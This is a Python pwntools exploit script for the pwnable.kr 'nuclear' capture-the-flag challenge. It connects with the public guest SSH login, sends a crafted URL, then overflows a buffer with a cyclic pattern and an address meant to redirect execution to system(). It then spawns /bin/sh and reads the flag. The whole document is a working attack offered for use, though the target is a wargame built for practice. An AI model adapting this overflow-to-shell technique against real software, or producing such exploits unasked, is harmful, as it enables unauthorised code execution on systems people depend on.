#!/usr/bin/env python3
import warnings
from pwn import *

warnings.filterwarnings("ignore", category=BytesWarning)

gs = '''
continue
'''

NUKE_OFF = 1016
SYSTEM_PLT_STUB = 0x400826

def sl(r, delim, data):
    r.sendlineafter(delim, data if isinstance(data, bytes) else str(data).encode())

def run_program():
    if args.LOCAL:
        return process('./nuclear_patched')
    elif args.GDB:
        return gdb.debug('./nuclear_patched', gs)
    else:
        sh = ssh(user='nuclear', host='pwnable.kr', port=2222, password='guest')
        return sh.remote("pwnable.kr", 9013)

class Options:
    def __init__(self, r):
        self.r = r

    def set_target(self, url):
        sl(self.r, b"select menu", b"2")
        sl(self.r, b"give me an URL! :", url)

    def launch(self, payload):
        sl(self.r, b"select menu", b"3")
        self.r.sendline(payload)

class ExploitPrimitives:
    def __init__(self, r):
        self.option = Options(r)
        self.r = r

    def overflow(self):
        payload1 = b"0" * 0x3e0 + b".0"
        payload2 = cyclic(NUKE_OFF) + p32(SYSTEM_PLT_STUB)
        self.option.set_target(payload1)
        self.option.launch(payload2)

    def win(self):
        sl(self.r, b"select menu", b"2")
        self.r.sendline(b"/bin/sh")
        self.r.recv()
        self.r.recv()
        self.r.sendline(b"cat flag")
        log.success(self.r.recv())
        self.r.close()


def main():
    r = run_program()
    exploit = ExploitPrimitives(r)
    exploit.overflow()
    exploit.win()

if __name__ == "__main__":
    main()
